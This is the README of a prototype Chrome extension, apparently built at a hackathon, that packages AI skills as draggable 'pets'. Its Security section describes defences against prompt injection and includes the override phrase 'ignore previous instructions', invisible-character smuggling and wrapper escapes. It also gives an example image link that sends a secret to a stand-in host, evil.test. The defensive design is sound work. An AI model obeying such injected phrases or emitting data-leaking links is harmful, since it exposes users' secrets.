# Skill Pet

A Chrome extension prototype of the **Skill Companion** concepts. You keep a **squad of pets**, each one a group of AI skills with its own permissions. **Drag a pet onto your work** (a paragraph, a text field, an image, a Google Docs page, a Figma frame) and it offers only the skills that fit what's there. Anything that would change your work is a **proposal you approve** first. Models are called through **[OpenRouter](https://openrouter.ai)**.

## The pieces

### 1. Skill Studio: make skills, stickers and pets

Open it from the extension's toolbar icon, or from Options. Three tabs sit next to **Import · Export · Settings · + New skill**:

- **Pets**
  - A rail of your pets on the left, plus **Adopt**. You can also drag a skill card onto a pet in the rail to teach it.
  - The selected pet's card has a hero header (character, editable name and role, one line on what it carries and reads).
  - **Skills list:** each row shows the sticker, kind tags and result (Answer, **Rewrites**, **Comments**). Expand a row for the instruction, what it works on, its result and which other pets know it, plus *Edit skill* and *Remove from Scout*.
  - **Settings:** look (character and color), *Can read* switches, *First in*, and *Release*.
- **+ Add skills** opens a side drawer: search, filter by Text, Editable, Images or Figma, tick several skills, then **Add N to Scout**.
- **All skills**
  - **Cards** view, split into *Yours* (with *Make a skill*) and *Templates*. Each card shows the instruction, *Works on*, *Result*, and **Known by**: tap a pet's face to give or take that skill.
  - **Stickers** view shows every skill as a big sticker.
- **History:** everything generated, filterable and searchable.
- **The skill editor:** instruction, works-on, result, ranking, which pets know it, a sticker designer (label, color, shape), and **Try it** with text or an image.

The look follows the design mockups: cool grey background, white rounded cards, indigo accent, the *M PLUS Rounded 1c* typeface, pill tags, and green labels for actions that change things.

### Characters

Each pet is one of eight characters: **cat, dog, bird, frog, bunny, bear, ghost, hedgehog**. They're drawn as SVG, with an open face and a happy ^^ face shown on hover and while working. The default squad is Scout the dog, Quill the bird, Pixel the cat, Sprout the frog and Security the hedgehog. In the Studio, each pet card has a character picker and color swatches, and *Adopt* picks a character the squad doesn't have yet. Pets saved before characters existed are migrated automatically.

### Security: the guard pet (AI safety & ethics)

![Bundles of Skills](extension/brand/logo.png)

**Security** is a hedgehog that joins the squad (Scout, Quill, Pixel, Sprout, Security). It does two jobs: it has its own skills, and it **guards every other pet**. Built for the Sandia Security Track: securely implementing AI, securing agentic workflows, and making AI security visible to everyday users.

**Its skills**

| Skill | Where it runs | What it does |
|---|---|---|
| Check for hidden instructions | **On this device** | Finds prompt injection in what you picked: "ignore previous instructions", fake system messages, requests to send data out or hide things from you, attempts to break out of the content wrapper, and **invisible text** (zero-width characters, text-direction overrides, Unicode "tag" characters used for ASCII smuggling). |
| Spot sensitive data | **On this device** | Lists API keys and tokens (OpenAI/OpenRouter, AWS, GitHub, Slack, Google, Figma, JWTs, private keys), passwords, emails, phone numbers, card numbers (Luhn-checked) and ID numbers. |
| Review for bias & harm | Model | Flags biased, exclusionary or harmful wording or imagery, with neutral alternatives. |
| Check AI output | Model | Claims to verify, signs of fabrication, overconfidence, and a reliability rating. |
| Is this a scam? | Model | Phishing and social-engineering signals, a verdict, and what to do next. |

The two on-device skills never call the model: Security checks your data without sending it anywhere. Their reports never repeat a secret in full.

**The guard (on by default, Options › Security guard)**

1. **Before anything leaves the browser.** Every run from any pet, and the Studio's *Try it*, is checked in the **service worker**, the one place every request passes through before the network. No page script can reach it or skip it. If Security finds secrets, personal data or hidden instructions, the run **pauses** and shows what it found, masked (`sk-or-…89`, `j***@example.com`). You choose **Redact & send** (secrets become `[API KEY]`, `[EMAIL]`… and invisible characters are removed), **Send anyway**, or **Cancel**. Nothing is sent until you choose.
2. **Untrusted output, before it acts.** Pets can rewrite your text and post Figma comments. Those are actions with side effects, so model output is treated as untrusted: Security checks it for invisible text, injected instructions, leaked secrets and **links that carry data out** (for example `![x](https://evil.test/p.png?d=<secret>)`). Leaking links and hidden text are **removed**, not just flagged, and the panel says so before you approve.
3. **Containment.** Picked content goes to the model inside `<picked_content>` and the system prompt treats it as data. Content can no longer close or reopen that wrapper: tag lookalikes inside it are neutralised, and a unit test proves injected text stays inside.
4. **Least privilege, visible.** The loading screen says exactly what is being sent and where ("Sending 41 words to the model (openrouter.ai), after a Security check"). Pets still only receive what their *Can read* permissions allow.
5. **Audit trail without the secrets.** Every History entry records what Security found, what you chose and where the data went ("Security: found secrets (1), personal data (1); masked 2 before sending"). History **never stores secrets or personal data**, even if you chose *Send anyway*: the saved input is always the masked version.

**Threat model**

| Threat | Mitigation |
|---|---|
| Sensitive data leaks to the model provider | Local scan + pause + redaction in the service worker; masked previews; masked History |
| Prompt injection in picked content (visible or invisible) | Local detection, strict data wrapper that content can't escape, invisible characters stripped on redaction |
| A model result smuggles instructions or data out when applied | Output scan before approve/post; leaking links and hidden text removed; "Approve anyway" makes it a conscious choice |
| A page script tampering with the guard | The guard runs in the service worker; the UI lives in a closed shadow root; keys never enter the page |
| Logs becoming a second leak | History stores masked input only, and Security's records hold counts and categories, never values |

The detection code is `src/security.js`: pure functions, no network, unit-tested for true positives *and* false positives on ordinary writing.

### 2. On any page: the squad dock (04 Pet squad)

The dock is frosted glass (blurred and tinted over whatever page is behind it, with a soft highlight edge), so it looks the same on every tab without hiding the page.

| Do this | What happens |
|---|---|
| **Drag a pet** onto something | A dashed outline shows what it will read ("Text", "Image", "Text field", "Selected Figma frame", "This page (screenshot)"). Drop, and the **pet card** opens with that pet's skills that fit, plus an *Ask Quill…* box. |
| **Select** (dock button or **Alt+Shift+L**) | Like a design tool: hover highlights the paragraph, image, field or frame under the pointer, and **click** picks it. **Drag** a box to take exactly the words, images and canvas inside it. **Shift-click** adds more, and **Enter** finishes. The selection then has **resize handles**: drag any corner or edge to grow or shrink it, and it re-reads exactly what's inside. Then drag a pet onto it, or press 1–9. |
| **Click a pet** | Uses what you picked with Select, or else your text selection. |
| **History** (dock button) | What the pets generated on this site (see below). |
| **Search** (dock button or **Alt+Shift+P**) | The command bar from v1, now over every pet's skills, showing which pet owns each. |
| **Select text** | Peek: the top 3 guesses pop up beside it (turn this off in Options). |
| **Alt+Shift+S** / **Alt+Shift+R** | Show/hide the squad · rerun the last skill on the current pick. |

### Minimized squad, hover cards, shortcuts

- **Minimize** (the – at the end of the bar, or in Options) shrinks the squad to **small pets** or **dots** (pick in Options). It expands on its own while you **hover** it, **select text**, use **Select**, have a **pick**, **drag** a pet, or use a pet's card. Then it shrinks back.
- **Hover a pet** to see what it can do: its skills with stickers, which ones rewrite or comment (after you approve), what it may read, and its shortcut. If you have selected something, skills that don't fit it are dimmed ("For your pick: 3 fit").
- **Shortcuts** (⌥ = Alt; **Alt+/** shows them all on the page):

| Keys | Does |
|---|---|
| **Alt+click** / **Alt+drag** anywhere | Select the thing under the pointer / everything in a box, right away |
| **Alt+Shift+L** | Select tool. **Shift-click** adds more, **Enter** finishes |
| **1–9** (when something is picked/selected and you're not typing) | Send it to pet 1–9 |
| **Alt+1–9** | Same, and works while typing (uses the text selected in the field) |
| In a pet's card: **1–9**, **↑↓**, **/** | Run skill n · move · ask anything |
| **Esc** | Cancel selecting / clear the selection / close |
| **Alt+Shift+P / H / S / R** | Search · History · show/hide squad · rerun last |

### Markdown answers

Answers render as formatted Markdown: headings, **bold**, *italic*, `code`, code blocks, bullet and numbered lists (nested), checklists, quotes, tables and links. The renderer builds page elements directly, so model text is never inserted as HTML, and links only work if they're http(s) or mailto. The prompt asks for Markdown when it helps scanning; rewrites and Figma comments stay plain text, because they go straight into your document. **Copy** puts rich text on the clipboard, so pasting into Docs or Gmail keeps the formatting, and plain-text apps get the Markdown.

### Pets stay where they worked (stickers)

After a pet generates something, it **stays on the page at that exact spot** as a small sticker:
- on the element you dropped it on, at the point where you dropped it
- or at the corner of your selection or Select pick

**One sticker per pet per page.** When Scout works somewhere else on the same page, its sticker moves to the new spot and the answer joins **Scout's history here**, instead of a second Scout sticker appearing. Every answer still remembers the exact spot it was made for:
- In the sticker card, each answer says *Here:* (the spot the sticker is on now) or *On:* (somewhere else), with **Go to this spot**. That scrolls the page (or inner panel) back there, flashes the outline, moves the sticker, and opens that answer.
- The dock's **History** panel has **Show on page** for answers made on this page.
- The Studio's **History** tab has **Show where it was made**. It switches to the tab with that page, or opens it, and jumps to the spot.

The pin is attached to the content, so it scrolls and reflows with the page, and it's **saved per page**: next time you open the page, the pins are back where they were. If a site re-renders, the extension finds the element again by its position in the page structure.

- **Hover** a pin to outline what it worked on. **Click** it to reopen everything generated there: rendered Markdown, quiz answers still hidden until you reveal them, what was applied or posted, and Copy.
- **Do more here:** from the pin, pick any pet and run another skill on the same spot, or **ask a follow-up**. Follow-ups include the earlier answers, so "make it shorter" or "turn that into a table" work. New runs on the same spot join the same pin (the badge shows how many).
- **Figma:** the pet sits inside the frame, where you dropped it, with a *Posted* badge once you approve the comment. The Figma comment itself is pinned inside the frame (24px in from its top-left corner) rather than on its edge. When you pan or zoom the canvas, the sticker follows the frame visually (see below). The real Figma comment always stays on the frame.
- Pins can be turned off in Options, removed one at a time from the pin card, and keep the 60 most recent pages.

### The selection is pinned to the page

What you pick with **Select** isn't a floating overlay. Each part is attached to the element it came from (a box is attached to that spot in the document). Its outline scrolls with the page and follows layout changes, and you can still drop a pet on it after scrolling. While the Select tool is open, the scroll wheel still scrolls the page, or the inner scroller under your pointer. The tool's full-screen layer only exists while you're picking; once you finish, the page is fully clickable again and only the outline stays.

### Long answers and quizzes

- Answers scroll inside the panel. This works even on Figma and Google Docs, which normally swallow the scroll wheel. The panel only follows new text while you're at the bottom, so you can scroll up and read during generation.
- **Expand** (⤢ in the panel header) opens a large reading view. The page's History panel and the Studio's history items also have Expand.
- **Reveal later:** *Quiz me* and *Make flashcards* show the questions with the answers hidden behind blurred cards. Click one to reveal it, or **Reveal all**. Answers stay hidden while generating too. Any skill can do this: tell it to print a line `=== ANSWERS ===` before the answers.

### Following scroll and zoom

Selections and stickers stay with the content rather than the screen:
- **Normal pages and inner panels** (Docs, Notion, chat apps): a spot is stored relative to the nearest scrolling container, so it moves when you scroll the page or the panel it's in, and it's corrected for CSS zoom.
- **Canvas apps** (Figma, Miro…), where the page's code doesn't show what's on screen: the extension keeps a tiny greyscale thumbnail of what you picked.
  - While you pan, it follows your wheel or drag. While you zoom, the outline fades.
  - When the canvas settles, it takes a screenshot and finds the thumbnail again at any zoom level, then snaps the outline and sticker back on.
  - If the spot is panned off-screen, the outline hides and the sticker card says so. It reappears when you pan back.

### 3. History and loading

- **Every generation is logged**, from pages and from the Studio's *Try it*. Each entry records the skill, the pet, the site, what it read, the output, and what happened next: *Generated*, *Approved & applied* (including your edits before approving), *Posted to Figma*, *Discarded*, *Stopped* or *Failed*.
  - **On a page:** the dock's **History** button opens a panel showing what was generated **on this site**. Switch to *Everywhere*, search, copy. Use **Show on page** to jump to where an answer was made.
  - **In the Studio:** the **History** tab has the full log. Filter by pages vs. Studio tests and by site, search, see input and output side by side, copy, delete, clear. Use **Show where it was made** to open that page at the spot.
  - Stored locally (last 300 runs). Images aren't kept, only a count.
- **Loading states:**
  - While generating, the panel shows the pet hopping, "Quill is rewriting…", what's being sent, an elapsed timer, skeleton lines and a **Stop** button. Text then streams in with a cursor.
  - "Sniffing…" shows while a pet reads a Figma frame or takes a screenshot, and "Reading your pick…" while a Select pick is processed.
  - The Studio's *Try it* has its own loader and a Stop button.

### 4. Context awareness: what it knows from what you picked

| You picked… | It reads | Skills offered | Can change it? |
|---|---|---|---|
| A paragraph / heading / selection | the text | text skills (summarize, explain, dates…) | — |
| A text field, Gmail draft, any rich editor | the text, marked *editable* | rewrite skills too (fix, tighten, soften, "rewrite as I ask") | **Yes**: you see original vs. proposed, can edit the proposal, then **Approve & replace** (undo still works) |
| An image | a screenshot of it | image skills (describe, critique, microcopy) | — |
| A **Figma** frame | the frame selected in Figma (from the URL's `node-id`). With a Figma token: a crisp render plus its text layers. Without one: a screenshot. | design skills | **Comments**: *Leave critique as comment* proposes a comment; **Approve & post** pins it to that frame through the Figma API |
| **Google Docs / Sheets / Slides** page | a screenshot (these apps draw on a canvas, so there's no readable text) | text + image skills | Copy only |
| A **Select** pick (one or more things, or a box) | each thing as above; a box takes the words inside it plus a screenshot if it holds images or a canvas | whatever fits all of it | One selected field can be rewritten |

Ranking also uses the app (Figma → design skills first, wikis → research), signals in the text (dates, non-Latin script), length, and what you use most. Nothing is sent to the model until you click a skill.

### Works on

Any normal site (wikis, news, docs sites, GitHub, Notion…), Gmail/Outlook (rewrite drafts in place), **Google Docs/Sheets/Slides** (by screenshot), **Figma** in the browser (frames, comments). It doesn't run on `chrome://` pages, the Chrome Web Store, or the built-in PDF viewer.

## Setup

```bash
git clone https://github.com/kkuang-max/hackathon && cd hackathon
npm install && npm run build
```

1. In `chrome://extensions`, turn on **Developer mode**, click **Load unpacked**, and pick the `extension/` folder. If it's already loaded, click the reload arrow instead.
2. Options opens. Paste your **OpenRouter key**. Pick a **vision-capable model** (needed for images, Figma and Docs screenshots), e.g. a Claude, GPT-4o-class or Gemini model from [openrouter.ai/models](https://openrouter.ai/models).
3. *Optional:* paste a **Figma personal access token** (Figma › Settings › Security; file read + comments write) to enable frame text and comments.
4. Reload any tabs that were already open. The squad appears at the bottom of every page.

## How it's built

```
 page (any site)                              service worker                     outside
┌────────────────────────────────┐ Port  ┌───────────────────────────┐
│ content.js                     │──────▶│ background.js             │──▶ openrouter.ai (stream)
│  dock · drag · select · cards  │◀──────│  keys live only here      │
│  reads text / screenshots      │       │  captureVisibleTab        │──▶ api.figma.com
│  approve → write back          │       │  figma.js (frame, comment)│
└────────────────────────────────┘       └───────────────────────────┘
 studio.html / studio.js ── chrome.storage.local "library" ──▶ every tab, live
 library.js: templates, default squad, matching, permissions, request building
```

- The UI is in a closed shadow root, so page CSS/JS can't touch it or read results. Keys never enter the page.
- Picked content goes to the model inside `<picked_content>`, and the system prompt treats it as data, not instructions.
- `library.js` is pure and unit-tested. Skills and pets are plain JSON, so anything the Studio makes can be exported.

## Tests

```bash
npm test
```

```bash
npm run e2e
```

No Playwright Chromium installed? Point the e2e run at any Chrome for Testing build: `CHROME_PATH=/path/to/chrome npm run e2e`.

`npm test` has 40 unit tests covering matching, permissions, Figma URL parsing, request building, history, the OpenRouter client, and Security (secret/PII/injection detection, false positives, redaction, link removal, wrapper containment, adding Security to older libraries). `npm run e2e` loads the real extension in Chromium with OpenRouter and the Figma API **faked**, then checks:
- drag Quill onto a field → approve a rewrite (and that nothing changes before approval)
- drag Pixel onto an image → a screenshot is sent
- box-select a paragraph → click Scout → summarize
- the search bar
- **Security**: Quill on a field holding an API key and an email → the guard pauses before sending → *Redact & send* → the request contains `[API KEY]` and `[EMAIL]`, never the real values, and History doesn't store them; *Cancel* sends nothing; Security's on-device injection check finds 3 issues without calling the model; a result with a data-leaking link is flagged and the link removed
- a fake Figma file → drag Pixel onto the frame → approve → a comment is posted to node `12:34` with the frame's text layers in the prompt
- Studio: Pets view (rail, Add skills drawer adds two skills, accordion details), All skills *Known by* toggle, Stickers view, create a new skill and assign it
- resizing a selection with its handles re-reads the new area
- minimize to small pets / dots, expand on hover, selection and Select, hover cards, Alt+1 / 1–9 / Alt-drag box select / click + Shift-click select / Alt+/;
- the selection stays pinned to the paragraph when scrolling and is still a drop target; the page scrolls under the Select tool;
- answers render as Markdown (heading, bold, table, checklist), no raw syntax;
- one sticker per pet: a second spot joins the pet's sticker history; History → Show on page and Studio → Show where it was made scroll back to the spot and open that answer;
- tracking: selections follow an inner scroll panel and CSS zoom; on a pannable canvas the outline follows panning, re-finds the spot after zooming, and hides when the spot is off-screen;
- pins: a pet is left where it worked, scrolls with the page, reopens answers, runs more skills and follow-ups on the same spot, survives a reload; the Figma pin sits in the frame with a Posted badge, and the comment is placed inside the frame;
- characters: species per pet, switching one in the Studio updates the dock live;
- a long quiz answer scrolls even when the page swallows wheel events, the panel expands, and answers stay hidden until clicked;
- the loading screen appears while generating; history logs approved / posted / Studio-test runs; the in-page History panel and the Studio History tab

Screenshots go to `test/screenshots/`.

## Known limits

- **Editing Figma layers** (changing text in the file) isn't possible from a browser extension. The REST API can read and comment, not edit, so that needs a small Figma plugin. Today pets propose new copy, which you can copy or post as a comment.
- **Google Docs**: the extension reads by screenshot and can't write back into the doc. Commenting into Docs would need the Docs API (OAuth) or a Docs add-on.
- **Canvas tracking is visual.** It can lose a spot that changes a lot (edited, re-styled) or that looks like something else nearby. When it loses one, it says so instead of guessing.
- **Screenshots only cover what's visible.** Scroll so the thing is on screen first.
- **Key handling**: each user brings their own OpenRouter key. A real product would put a backend in front.

## Feasibility: extension vs. desktop app

**Short answer: build it in two stages.** A browser extension gets you about 70% of the experience in days. "Any app on my computer" needs a native desktop app, which is quite doable but is a real project with OS permission prompts.

### What a browser extension can and can't do

| | |
|---|---|
| ✅ Read the selection, the page title and the site | `window.getSelection()`, input `selectionStart/End` |
| ✅ Write back into text fields and most rich editors | `setRangeText`; `execCommand('insertText')` keeps the editor's undo |
| ✅ Hotkeys | `chrome.commands`, but **only while Chrome is focused**. There's a hard limit of 4 suggested shortcuts, and they need Ctrl/Alt (+Shift). A bare double-tap of ⌥ is impossible. |
| ✅ Drag-and-drop files *onto the pet* inside a page | Standard DnD. Good enough for a browser-only "Feeding bowl". |
| ⚠️ **Google Docs** | Docs draws text on a **canvas**, so `getSelection()` comes back empty. This build reads it by **screenshot + a vision model** (drag a pet onto the page, or use Select). Writing back needs the Docs API through an add-on. |
| ⚠️ Iframes / shadow-DOM editors | You need `all_frames: true` and per-site handling. |
| ❌ Other apps (Mail.app, Figma desktop, Slack desktop, VS Code…) | Out of reach. |
| ❌ `chrome://` pages, the Web Store, the built-in PDF viewer | Content scripts are blocked there. |

### Desktop app (Tauri or Electron), for "any app"

| Need | How | Effort |
|---|---|---|
| Global hotkey, even with Chrome in the background | Electron `globalShortcut` / Tauri `global-shortcut` plugin | Easy |
| Double-tap ⌥ or Fn (concepts 02, 09) | Low-level key monitor: macOS `CGEventTap` needs **Input Monitoring** permission; Windows uses a `SetWindowsHookEx` LL hook | Medium |
| Read the selection in any app | macOS Accessibility API (`AXSelectedText`), which needs **Accessibility** permission. Fallback: simulate ⌘C, read the clipboard, then restore it. Windows: UI Automation `TextPattern`. | Medium; works in most native apps, while Electron and canvas apps need the clipboard fallback |
| Pet floating over everything, burrow in the menu bar (01, 03, 08) | Transparent, always-on-top, click-through window plus a tray/menu-bar icon | Easy |
| Drop the pet *onto* a spot in another app (01 Fetch) | Hit-testing another app's UI: `AXUIElementCopyElementAtPosition` on macOS | Hard, and the payoff is mostly flair. Ship Peek first. |
| Detect a selection in any app without a hotkey (07 Peek) | Poll or observe AX selection-change notifications per app | Medium. Battery and noise are the risk, so ship it opt-in per app. |
| Voice (09 Whistle) | Push-to-talk, then on-device or cloud speech-to-text, then the same skill runner | Medium |

### The 10 concepts, ranked by how cheaply you can prove them

1. **08 Burrow** (hotkey command bar): ✅ built (the Search button). Lowest risk, works everywhere.
2. **07 Peek** (select → guesses): ✅ built. The magic moment. The risk is that it gets annoying, so it has an ignore timeout, a per-site blocklist and an off switch.
3. **01 Fetch** (drop the pet on a spot): ✅ built in the browser. Doing it in other desktop apps needs the desktop app.
4. **02 Tap wheel**: ✅ "rerun last" built. A radial menu is a UI swap on the bar. A true double-tap needs the desktop app.
5. **05 Charm collar** (loadouts with shared docs): next step. Pets already act as loadouts; shared docs are the missing part. Add `loadouts: {skills[], contextFiles[]}` and auto-equip by site. Pure data, no new platform work.
6. **06 Feeding bowl**: feasible in the extension for in-page drops and pasted screenshots (vision models read images). Dropping from the Finder or Desktop needs the desktop app.
7. **03 Skill stickers**: every skill has a sticker in the Studio, shown in pet cards. Sticking one onto content as a lasting badge: the "badge stays on the content" part means anchoring to other apps' DOM, which is fragile. Do it in-browser only, if at all.
8. **04 Pet squad**: ✅ built: the dock, pets as skill groups, per-pet permissions, Studio.
9. **10 Trick trail**: chaining is easy on the backend (feed output N into skill N+1). The hopping-pet UI is the real work.
10. **09 Whistle**: needs the desktop app and speech. Do it last.

### Before this is a product, not a demo

- **No API key in the client.** Put a small backend in front of the API (auth, rate limits, usage metering). Today each user pastes their own key, which is fine for an MVP and nothing more.
- **Privacy.** Peek reads selections all the time, though only *locally*. Nothing is sent until you click a skill. Keep it that way, and say so in onboarding.
- **Chrome Web Store review.** The `<all_urls>` content script draws extra scrutiny. Expect a justification step, or switch to `activeTab` and inject on demand, which costs you Peek.
